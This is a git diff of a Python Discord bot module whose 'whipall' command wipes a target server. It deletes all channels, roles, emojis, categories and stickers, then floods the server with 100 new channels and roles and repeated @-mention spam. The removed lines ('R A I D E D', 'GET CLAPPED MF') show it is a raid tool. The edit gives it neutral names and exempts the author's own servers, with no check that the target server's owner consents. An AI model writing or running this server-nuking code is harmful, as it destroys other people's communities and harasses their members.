@@ -2,16 +2,22 @@ import discord
 from discord.ext import commands
 import asyncio
 
-# Allowed users
-ALLOWED_USERS = [1402431821534330911, 1167531276467708055, 1369169749946400798]  # replace with your ID(s)
+# -----------------------------
+# CONFIGURATION
+# -----------------------------
+ALLOWED_USERS = [1402431821534330911, 1167531276467708055, 1369169749946400798]  # Replace with your Discord ID(s)
+BLOCKED_GUILDS = [1363562800793915583, 1191341745204629535, 1384136902168285218, 1331286968386060328, 1284542162574377032]  # Servers where the command will NOT work
 
-# Customize the new channel and role names here
-NEW_CHANNEL_NAME = "R A I D E D"
-NEW_ROLE_NAME = "F U C K"
-NUM_TO_CREATE = 100  # Number of channels/roles to create after wipe
-NUM_MESSAGES = 25    # Number of messages to send in each channel
-MESSAGE_CONTENT = "@everyone GET CLAPPED MF 😭🙏"
+NEW_CHANNEL_NAME = "general"   # Name for new channels
+NEW_ROLE_NAME = "role"         # Name for new roles
+NUM_TO_CREATE = 100             # Number of channels and roles to create
+NUM_MESSAGES = 25               # Number of messages per channel
+MESSAGE_CONTENT = "@fadi_fazbarr please edit this channel that I created."  # Message content
+MESSAGE_DELAY = 0.5             # Delay (seconds) between messages to avoid rate limits
 
+# -----------------------------
+# COG
+# -----------------------------
 class WipeAndRebuild(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
@@ -19,15 +25,22 @@ class WipeAndRebuild(commands.Cog):
     @commands.command(name="whipall")
     async def whip_all(self, ctx, guild_id: int):
         """Wipes a target server and creates new channels/roles/messages (restricted)."""
+        # --- Permission check ---
         if ctx.author.id not in ALLOWED_USERS:
             await ctx.send("❌ You are not allowed to use this command.")
             return
 
+        # --- Guild check ---
         guild = self.bot.get_guild(guild_id)
         if not guild:
             await ctx.send("❌ I am not in that server or the ID is invalid.")
             return
 
+        if guild.id in BLOCKED_GUILDS:
+            await ctx.send("❌ This server is protected. You cannot use this command here.")
+            return
+
+        # --- Confirmation ---
         await ctx.send(f"⚠️ Are you sure you want to wipe **{guild.name}**? Type `CONFIRM` to continue.")
 
         def check(m):
@@ -40,12 +53,16 @@ class WipeAndRebuild(commands.Cog):
             return
 
         # --- Wipe Section ---
+        await ctx.send("🧹 Wiping server...")
+
+        # Delete channels
         for channel in guild.channels:
             try:
                 await channel.delete()
             except:
                 continue
 
+        # Delete roles (skip @everyone)
         for role in guild.roles:
             if role.is_default():
                 continue
@@ -54,18 +71,21 @@ class WipeAndRebuild(commands.Cog):
             except:
                 continue
 
+        # Delete emojis
         for emoji in guild.emojis:
             try:
                 await emoji.delete()
             except:
                 continue
 
+        # Delete categories
         for category in guild.categories:
             try:
                 await category.delete()
             except:
                 continue
 
+        # Delete stickers
         try:
             stickers = await guild.fetch_stickers()
             for sticker in stickers:
@@ -101,11 +121,14 @@ class WipeAndRebuild(commands.Cog):
             for _ in range(NUM_MESSAGES):
                 try:
                     await channel.send(MESSAGE_CONTENT)
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(MESSAGE_DELAY)
                 except:
                     continue
 
         await ctx.send(f"✅ Rebuild complete! Created {NUM_TO_CREATE} channels and roles, with {NUM_MESSAGES} messages in each channel.")
 
+# -----------------------------
+# SETUP
+# -----------------------------
 async def setup(bot):
     await bot.add_cog(WipeAndRebuild(bot))
